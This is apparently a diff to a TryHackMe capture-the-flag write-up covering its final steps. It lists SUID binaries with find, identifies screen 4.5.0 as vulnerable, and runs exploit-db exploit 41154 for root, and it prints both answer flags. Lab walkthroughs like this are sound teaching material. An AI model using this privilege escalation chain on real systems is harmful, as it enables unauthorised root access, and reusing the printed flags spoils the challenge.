@@ -172,16 +172,39 @@ applicable law.
 Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
 joker@ubuntu:~$ 
 ```
+## User flag
+```
 cat user.txt 
 ```
 ```
 THM{d5781e53b130efe2f94f9b0354a5e4ea}
 ```
+### Post Exploitation
 ```
 find / -user root -perm -u=s 2>/dev/null
+```
+### Screen-4.5.0 is vulnerable for privesc.
+```
 ls -l /bin/screen*
-# https://www.exploit-db.com/exploits/41154
-sh 41154.sh 
+```
+### Let exploit 
+```
+https://www.exploit-db.com/exploits/41154
+```
+### Copy the exploit
+```
+nano exploit.sh
+```
+### Past it & Run
+```
+sh 41154.sh
+```
+## Root flag
+```
 cat /root/root.txt
+```
+```
 THM{5ecd98aa66a6abb670184d7547c8124a}
 ```
+
+### Done !! 🙂
